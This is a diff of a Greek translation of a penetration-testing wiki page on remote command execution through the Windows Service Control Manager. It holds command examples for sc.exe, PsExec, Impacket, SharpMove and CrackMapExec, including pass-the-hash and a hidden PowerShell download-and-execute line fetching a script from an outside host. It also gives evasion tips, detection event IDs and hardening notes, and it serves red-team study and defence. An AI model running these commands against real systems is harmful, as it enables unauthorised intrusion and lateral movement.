@@ -4,23 +4,24 @@
 
 ## Πώς λειτουργούν
 
-Αυτές οι τεχνικές κάνουν abuse στον Windows Service Control Manager (SCM) απομακρυσμένα μέσω SMB/RPC για την εκτέλεση εντολών σε ένα target host. Η συνήθης ροή είναι:
+Αυτές οι τεχνικές καταχρώνται απομακρυσμένα το Windows Service Control Manager (SCM) μέσω SMB/RPC, για να εκτελέσουν εντολές σε έναν host-στόχο. Η συνήθης ροή είναι:
 
-1. Γίνεται authentication στο target και πρόσβαση στο ADMIN$ share μέσω SMB (TCP/445).
-2. Αντιγράφεται ένα executable ή καθορίζεται μια LOLBAS command line που θα εκτελέσει το service.
-3. Δημιουργείται απομακρυσμένα ένα service μέσω SCM (MS-SCMR μέσω \PIPE\svcctl), το οποίο δείχνει σε αυτή την εντολή ή το binary.
-4. Εκκινείται το service για την εκτέλεση του payload και, προαιρετικά, γίνεται capture των stdin/stdout μέσω named pipe.
-5. Διακόπτεται το service και γίνεται cleanup (διαγραφή του service και τυχόν dropped binaries).
+1. Κάντε authenticate στον στόχο και αποκτήστε πρόσβαση στο share ADMIN$ μέσω SMB (TCP/445).
+2. Αντιγράψτε ένα εκτελέσιμο αρχείο ή ορίστε μια γραμμή εντολών LOLBAS που θα εκτελέσει η υπηρεσία.
+3. Δημιουργήστε απομακρυσμένα μια υπηρεσία μέσω SCM (MS-SCMR μέσω \PIPE\svcctl), η οποία θα δείχνει στην εντολή ή στο binary.
+4. Εκκινήστε την υπηρεσία για να εκτελεστεί το payload και, προαιρετικά, καταγράψτε τα stdin/stdout μέσω ενός named pipe.
+5. Διακόψτε την υπηρεσία και κάντε cleanup (διαγράψτε την υπηρεσία και τυχόν binaries που αντιγράφηκαν στον στόχο).
 
-Requirements/prereqs:
-- Local Administrator στο target (SeCreateServicePrivilege) ή ρητά δικαιώματα δημιουργίας service στο target.
-- Το SMB (445) πρέπει να είναι reachable και το ADMIN$ share διαθέσιμο· το Remote Service Management πρέπει να επιτρέπεται μέσω του host firewall.
-- UAC Remote Restrictions: με local accounts, το token filtering μπορεί να εμποδίσει τον admin μέσω του network, εκτός αν χρησιμοποιείται ο built-in Administrator ή `LocalAccountTokenFilterPolicy=1`.
-- Kerberos vs NTLM: η χρήση hostname/FQDN ενεργοποιεί Kerberos· η σύνδεση μέσω IP συχνά κάνει fallback σε NTLM (και μπορεί να είναι blocked σε hardened environments).
+Απαιτήσεις/προϋποθέσεις:
+- Local Administrator στον στόχο (SeCreateServicePrivilege) ή ρητά δικαιώματα δημιουργίας υπηρεσιών στον στόχο.
+- Να είναι προσβάσιμο το SMB (445) και διαθέσιμο το share ADMIN$· να επιτρέπεται το Remote Service Management από το firewall του host.
+- UAC Remote Restrictions: με τοπικούς λογαριασμούς, το token filtering μπορεί να εμποδίσει την πρόσβαση διαχειριστή μέσω δικτύου, εκτός αν χρησιμοποιείτε τον ενσωματωμένο λογαριασμό Administrator ή ορίσετε LocalAccountTokenFilterPolicy=1.
+- Kerberos vs NTLM: η χρήση hostname/FQDN ενεργοποιεί το Kerberos· η σύνδεση μέσω IP συχνά οδηγεί σε fallback στο NTLM (και μπορεί να αποκλείεται σε hardened περιβάλλοντα).
 
-### Manual ScExec/WinExec μέσω sc.exe
+### Χειροκίνητο ScExec/WinExec μέσω sc.exe
 
-Το παρακάτω δείχνει μια minimal προσέγγιση δημιουργίας service. Το service image μπορεί να είναι ένα dropped EXE ή ένα LOLBAS όπως το cmd.exe ή το powershell.exe.
+Το παρακάτω δείχνει μια ελάχιστη προσέγγιση δημιουργίας υπηρεσίας. Το image της υπηρεσίας μπορεί να είναι ένα EXE που αντιγράφηκε στον στόχο ή ένα LOLBAS όπως το cmd.exe ή το powershell.exe.
+
 ```cmd
 :: Execute a one-liner without dropping a binary
 sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
@@ -33,18 +34,20 @@ sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= de
 sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
+
 Σημειώσεις:
 - Αναμένετε σφάλμα timeout κατά την εκκίνηση ενός EXE που δεν είναι service· η εκτέλεση πραγματοποιείται κανονικά.
-- Για πιο OPSEC-friendly λειτουργία, προτιμήστε fileless commands (`cmd /c`, `powershell -enc`) ή διαγράψτε τα dropped artifacts.
+- Για να είστε πιο OPSEC-friendly, προτιμήστε fileless εντολές (cmd /c, powershell -enc) ή διαγράψτε τα artifacts που αφήσατε.
 
-Βρείτε πιο λεπτομερή βήματα στο: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
+Βρείτε αναλυτικότερα βήματα εδώ: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
 ## Εργαλεία και παραδείγματα
 
 ### Sysinternals PsExec.exe
 
-- Κλασικό admin tool που χρησιμοποιεί SMB για να κάνει drop το PSEXESVC.exe στο ADMIN$, εγκαθιστά ένα προσωρινό service (προεπιλεγμένο όνομα PSEXESVC) και κάνει proxy το I/O μέσω named pipes.
+- Κλασικό εργαλείο διαχείρισης που χρησιμοποιεί SMB για να αφήσει το PSEXESVC.exe στο ADMIN$, να εγκαταστήσει μια προσωρινή service (προεπιλεγμένο όνομα PSEXESVC) και να μεταφέρει I/O μέσω named pipes.
 - Παραδείγματα χρήσης:<sup>[[1]](#references)</sup>
+
 ```cmd
 :: Interactive SYSTEM shell on remote host
 PsExec64.exe -accepteula \\HOST -s -i cmd.exe
@@ -55,16 +58,20 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-- Μπορείτε να εκκινήσετε απευθείας από το Sysinternals Live μέσω WebDAV:
+
+- Μπορείτε να το εκκινήσετε απευθείας από το Sysinternals Live μέσω WebDAV:
+
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
+
 OPSEC
-- Αφήνει συμβάντα εγκατάστασης/απεγκατάστασης υπηρεσίας (το όνομα της υπηρεσίας είναι συχνά PSEXESVC, εκτός αν χρησιμοποιείται το -r) και δημιουργεί το C:\Windows\PSEXESVC.exe κατά την εκτέλεση.
+- Αφήνει συμβάντα εγκατάστασης/κατάργησης υπηρεσίας (το όνομα της υπηρεσίας είναι συχνά PSEXESVC, εκτός αν χρησιμοποιείται το -r) και δημιουργεί το C:\Windows\PSEXESVC.exe κατά την εκτέλεση.
 
-### Impacket psexec.py (PsExec-like)
+### Impacket psexec.py (παρόμοιο με PsExec)
 
-- Χρησιμοποιεί μια ενσωματωμένη υπηρεσία τύπου RemCom. Αποθέτει ένα προσωρινό binary υπηρεσίας (συνήθως με τυχαιοποιημένο όνομα) μέσω του ADMIN$, δημιουργεί μια υπηρεσία (συνήθως με προεπιλεγμένο όνομα RemComSvc) και κάνει proxy το I/O μέσω ενός named pipe.
+- Χρησιμοποιεί μια ενσωματωμένη υπηρεσία τύπου RemCom. Αποθέτει ένα προσωρινό δυαδικό αρχείο υπηρεσίας (συνήθως με τυχαιοποιημένο όνομα) μέσω του ADMIN$, δημιουργεί μια υπηρεσία (συχνά την προεπιλεγμένη RemComSvc) και προωθεί την είσοδο/έξοδο μέσω ενός named pipe.
+
 ```bash
 # Password auth
 psexec.py DOMAIN/user:Password@HOST cmd.exe
@@ -78,66 +85,75 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 # Change service name and output encoding
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
+
 Τεχνουργήματα
-- Προσωρινό EXE στο C:\Windows\ (8 τυχαίοι χαρακτήρες). Το όνομα της υπηρεσίας είναι RemComSvc από προεπιλογή, εκτός αν παρακαμφθεί.
+- Προσωρινό EXE στο C:\Windows\ (8 τυχαίοι χαρακτήρες). Το όνομα της υπηρεσίας είναι από προεπιλογή RemComSvc, εκτός αν παρακαμφθεί.
 
 ### Impacket smbexec.py (SMBExec)
 
-- Δημιουργεί μια προσωρινή υπηρεσία που εκκινεί το cmd.exe και χρησιμοποιεί ένα named pipe για I/O. Γενικά αποφεύγει την απόθεση ενός πλήρους EXE payload· η εκτέλεση εντολών είναι ημι-διαδραστική.
+- Δημιουργεί μια προσωρινή υπηρεσία που εκκινεί το cmd.exe και χρησιμοποιεί ένα named pipe για I/O. Συνήθως αποφεύγει την απόθεση ενός πλήρους EXE payload· η εκτέλεση εντολών είναι ημι-διαδραστική.
+
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
-### SharpLateral και SharpMove
+
+### SharpLateral and SharpMove
 
 - Το [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) υλοποιεί διάφορες μεθόδους lateral movement, συμπεριλαμβανομένου του service-based exec.
+
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-- Το [SharpMove](https://github.com/0xthirteen/SharpMove) περιλαμβάνει τροποποίηση/δημιουργία υπηρεσίας για την απομακρυσμένη εκτέλεση μιας εντολής.
+
+- Το [SharpMove](https://github.com/0xthirteen/SharpMove) περιλαμβάνει τροποποίηση/δημιουργία υπηρεσιών για την απομακρυσμένη εκτέλεση μιας εντολής.
+
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
+
 - Μπορείτε επίσης να χρησιμοποιήσετε το CrackMapExec για εκτέλεση μέσω διαφορετικών backends (psexec/smbexec/wmiexec):
+
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
-## OPSEC, detection και artifacts
 
-Τυπικά artifacts σε host/network κατά τη χρήση τεχνικών τύπου PsExec:
-- Τα Security 4624 (Logon Type 3) και 4672 (Special Privileges) στο target για τον admin account που χρησιμοποιήθηκε.
-- Τα Security 5140/5145 File Share και File Share Detailed events, που εμφανίζουν πρόσβαση στο ADMIN$ και create/write των service binaries (π.χ. PSEXESVC.exe ή τυχαίο 8-char .exe).
-- Το Security 7045 Service Install στο target: service names όπως PSEXESVC, RemComSvc ή custom (-r / -service-name).
-- Το Sysmon 1 (Process Create) για το services.exe ή το service image, το 3 (Network Connect), το 11 (File Create) στο C:\Windows\, και τα 17/18 (Pipe Created/Connected) για pipes όπως \\.\pipe\psexesvc, \\.\pipe\remcom_* ή τα αντίστοιχα randomized.
-- Registry artifact για το Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 στο operator host (αν δεν έχει γίνει suppress).
+## OPSEC, ανίχνευση και artifacts
 
-Ιδέες για hunting
-- Δημιουργήστε alert για service installs όπου το ImagePath περιλαμβάνει cmd.exe /c, powershell.exe ή τοποθεσίες TEMP.
-- Αναζητήστε process creations όπου το ParentImage είναι C:\Windows\PSEXESVC.exe ή children του services.exe που εκτελούνται ως LOCAL SYSTEM και εκτελούν shells.
-- Επισημάνετε named pipes που τελειώνουν σε -stdin/-stdout/-stderr ή σε γνωστά PsExec clone pipe names.
+Τυπικά artifacts στον host/στο δίκτυο κατά τη χρήση τεχνικών τύπου PsExec:
+- Security 4624 (Logon Type 3) και 4672 (Special Privileges) στον target για τον λογαριασμό admin που χρησιμοποιήθηκε.
+- Συμβάντα Security 5140/5145 File Share και File Share Detailed που δείχνουν πρόσβαση στο ADMIN$ και δημιουργία/εγγραφή service binaries (π.χ., PSEXESVC.exe ή τυχαίο .exe 8 χαρακτήρων).
+- **System** 7045 από το Service Control Manager για εγκατάσταση service στον target: ονόματα όπως PSEXESVC, RemComSvc ή προσαρμοσμένο όνομα (`-r` / `-service-name`). Αυτό αποδεικνύει ότι εγκαταστάθηκε ένα service, όχι ότι εκτελέστηκε το image του. Συσχετίστε τη χρονική σήμανση και τη διαδρομή του image με συμβάντα διεργασιών ή με μια αντίστοιχη εγγραφή service-image prefetch, όταν είναι διαθέσιμη.<sup>[[4]](#references)</sup>
+- Sysmon 1 (Process Create) για το services.exe ή το image του service, 3 (Network Connect), 11 (File Create) στο C:\Windows\, 17/18 (Pipe Created/Connected) για pipes όπως \\.\pipe\psexesvc, \\.\pipe\remcom_* ή τυχαίες παραλλαγές.
+- Artifact μητρώου για το Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 στον host του operator (αν δεν έχει κατασταλεί).
 
-## Troubleshooting συνηθισμένων failures
-- Access is denied (5) κατά τη δημιουργία services: δεν υπάρχει πραγματικό local admin privilege, ισχύουν UAC remote restrictions για local accounts ή υπάρχει EDR tampering protection στη service binary path.
-- The network path was not found (53) ή αδυναμία σύνδεσης στο ADMIN$: firewall που μπλοκάρει SMB/RPC ή απενεργοποιημένα admin shares.
-- Το Kerberos αποτυγχάνει αλλά το NTLM είναι blocked: συνδεθείτε χρησιμοποιώντας hostname/FQDN (όχι IP), βεβαιωθείτε ότι υπάρχουν τα σωστά SPNs ή δώστε -k/-no-pass με tickets όταν χρησιμοποιείτε Impacket.
-- Το service start κάνει timeout αλλά το payload εκτελέστηκε: αναμενόμενο όταν δεν πρόκειται για πραγματικό service binary· κάντε capture το output σε αρχείο ή χρησιμοποιήστε smbexec για live I/O.
+Ιδέες για threat hunting
+- Ειδοποίηση για εγκαταστάσεις service όπου το ImagePath περιλαμβάνει cmd.exe /c, powershell.exe ή τοποθεσίες TEMP.
+- Αναζήτηση δημιουργίας διεργασιών όπου το ParentImage είναι C:\Windows\PSEXESVC.exe ή όπου τα children του services.exe εκτελούνται ως LOCAL SYSTEM και εκτελούν shells.
+- Επισήμανση named pipes που τελειώνουν σε -stdin/-stdout/-stderr ή σε γνωστά ονόματα pipe κλώνων του PsExec.
 
-## Hardening notes
-- Τα Windows 11 24H2 και Windows Server 2025 απαιτούν SMB signing by default για outbound (και Windows 11 inbound) connections. Αυτό δεν διακόπτει τη legitimate χρήση του PsExec με valid creds, αλλά αποτρέπει το unsigned SMB relay abuse και μπορεί να επηρεάσει συσκευές που δεν υποστηρίζουν signing.<sup>[[2]](#references)</sup>
-- Το νέο SMB client NTLM blocking (Windows 11 24H2/Server 2025) μπορεί να αποτρέψει το NTLM fallback κατά τη σύνδεση μέσω IP ή σε non-Kerberos servers. Σε hardened environments αυτό θα διακόψει το NTLM-based PsExec/SMBExec· χρησιμοποιήστε Kerberos (hostname/FQDN) ή ρυθμίστε exceptions όταν αυτό απαιτείται legitimately.<sup>[[2]](#references)</sup>
-- Principle of least privilege: ελαχιστοποιήστε τη συμμετοχή σε local admin groups, προτιμήστε Just-in-Time/Just-Enough Admin, επιβάλετε LAPS και παρακολουθείτε/δημιουργήστε alerts για 7045 service installs.
+## Αντιμετώπιση συνηθισμένων προβλημάτων
+- Access is denied (5) κατά τη δημιουργία services: δεν είστε πραγματικά local admin, ισχύουν UAC remote restrictions για local accounts ή υπάρχει προστασία EDR κατά της παραποίησης στη διαδρομή του service binary.
+- The network path was not found (53) ή αποτυχία σύνδεσης στο ADMIN$: το firewall αποκλείει SMB/RPC ή τα admin shares είναι απενεργοποιημένα.
+- Αποτυχία Kerberos ενώ το NTLM είναι αποκλεισμένο: συνδεθείτε με hostname/FQDN (όχι IP), βεβαιωθείτε ότι υπάρχουν τα σωστά SPNs ή δώστε -k/-no-pass μαζί με tickets όταν χρησιμοποιείτε Impacket.
+- Λήξη χρονικού ορίου κατά την εκκίνηση του service, παρότι εκτελέστηκε το payload: αναμενόμενο αν δεν πρόκειται για πραγματικό service binary· καταγράψτε την έξοδο σε αρχείο ή χρησιμοποιήστε smbexec για ζωντανό I/O.
+
+## Σημειώσεις για hardening
+- Τα Windows 11 24H2 και Windows Server 2025 απαιτούν SMB signing από προεπιλογή για εξερχόμενες συνδέσεις (και εισερχόμενες στα Windows 11). Αυτό δεν εμποδίζει τη νόμιμη χρήση του PsExec με έγκυρα creds, αλλά αποτρέπει την κατάχρηση unsigned SMB relay και μπορεί να επηρεάσει συσκευές που δεν υποστηρίζουν signing.<sup>[[2]](#references)</sup>
+- Η νέα δυνατότητα αποκλεισμού NTLM στον SMB client (Windows 11 24H2/Server 2025) μπορεί να εμποδίσει την εναλλακτική χρήση NTLM κατά τη σύνδεση μέσω IP ή σε servers χωρίς Kerberos. Σε περιβάλλοντα με ενισχυμένη ασφάλεια, αυτό θα εμποδίσει το PsExec/SMBExec που βασίζεται σε NTLM· χρησιμοποιήστε Kerberos (hostname/FQDN) ή ρυθμίστε εξαιρέσεις, αν απαιτείται για νόμιμη χρήση.<sup>[[2]](#references)</sup>
+- Αρχή του ελάχιστου προνομίου: περιορίστε στο ελάχιστο τη συμμετοχή σε local admin, προτιμήστε Just-in-Time/Just-Enough Admin, επιβάλετε LAPS και παρακολουθείτε/ενεργοποιείτε ειδοποιήσεις για εγκαταστάσεις service 7045.
 
 ## Δείτε επίσης
 
-- WMI-based remote exec (συχνά περισσότερο fileless):
+- Απομακρυσμένη εκτέλεση μέσω WMI (συχνά με λιγότερα αρχεία):
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRM-based remote exec:
+- Απομακρυσμένη εκτέλεση μέσω WinRM:
 
 {{#ref}}
 ./winrm.md
@@ -146,7 +162,7 @@ cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ## References
 
 - [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
-- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
-- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
+- [2] [Ενίσχυση ασφάλειας SMB στα Windows Server 2025 και Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Χρήση διαπιστευτηρίων για την κατάληψη Windows Boxes - Μέρος 2 (PSExec και Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+- [4] [Microsoft – Αντιμετώπιση απρόσμενων επανεκκινήσεων με χρήση των system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
 {{#include ../../banners/hacktricks-training.md}}
